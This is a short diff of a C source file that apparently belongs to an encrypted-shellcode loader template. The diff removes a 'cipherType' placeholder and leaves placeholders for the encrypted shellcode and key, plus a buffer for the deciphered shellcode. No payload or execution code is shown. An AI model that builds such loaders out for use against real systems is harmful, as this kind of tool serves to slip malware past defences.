@@ -30,8 +30,7 @@ int main() {
         return 0;
     char encryptedShellcode[] = "CHANGEME";
     char key[] = "CHANGEME";
-    char cipherType[] = "CHANGEME";
-
+    
     // Char array to host the deciphered shellcode
     char shellcode[sizeof encryptedShellcode];
 
